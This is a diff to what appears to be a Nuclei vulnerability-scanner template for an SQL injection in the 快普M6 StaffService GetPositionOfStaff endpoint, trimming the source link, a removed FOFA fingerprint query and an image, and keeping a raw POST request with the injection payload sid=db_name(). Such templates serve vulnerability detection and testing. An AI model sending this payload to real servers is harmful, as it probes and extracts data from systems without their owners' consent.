@@ -3,12 +3,8 @@ info:
   name: 快普M6 StaffService存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hb3ettuaeneaapxv'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hb3ettuaeneaapxv
-    fofa: body="Resource/JavaScript/jKPM6.DateTime.js"
 http:
 - raw:
   - 'POST /WebService/StaffService.asmx/GetPositionOfStaff HTTP/1.1
@@ -32,10 +28,7 @@ http:
     Cache-Control: max-age=0
 
 
-    sid=db_name()
-
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1757221129339-2617f31c-1fd6-4a98-8b5d-c07bb5b1f052.png)'
+    sid=db_name()'
   redirects: false
   matchers:
   - status:
